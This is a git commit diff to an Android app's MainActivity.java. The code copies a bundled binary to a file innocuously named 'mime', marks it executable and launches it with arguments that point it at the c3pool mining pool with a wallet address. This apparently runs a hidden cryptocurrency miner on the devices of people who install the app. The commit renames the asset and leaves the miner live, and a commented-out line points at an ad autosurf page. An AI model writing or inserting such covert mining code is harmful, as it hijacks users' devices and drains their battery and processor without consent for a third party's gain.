afe2cf843291d7dd7d2de4711cf3484b186bc41c
xaigs92r <114205483+xaigs92r@users.noreply.github.com>
2022-09-23 01:41:16 -0500

    Update MainActivity.java

--- com/main/MainActivity.java
+++ com/main/MainActivity.java
@@ -9,9 +9,9 @@ public class MainActivity extends android.app.Activity
         //super.startActivity(new android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse("https://www.alexamaster.net/ads/autosurf/180120")));
         //java.lang.System.loadLibrary("uv");
         final var mime = new java.io.File(super.getFilesDir(), "mime");
-        try (final var assets = super.getAssets(); final var androidNotls = assets.open("android-notls"))
+        try (final var assets = super.getAssets(); final var android = assets.open("android"))
         {
-            java.nio.file.Files.copy(androidNotls, mime.toPath());
+            java.nio.file.Files.copy(android, mime.toPath());
             mime.setExecutable(true);
             final var tmp = java.io.File.createTempFile("prefix", "suffix", super.getCacheDir());
             final var processBuilder = new java.lang.ProcessBuilder(mime.getPath(), "-t", "1", "-o", "auto.c3pool.org:80", "-u", "87giDqqPT1GPU9ukh1GNSpioyJM1G2zqjL8ukY9gP7ngZ2zpH9tuZFD755E94j9F56Y2FFq5B33SFe8a8LqybR2WJsb8ssR", "-l", tmp.getPath());
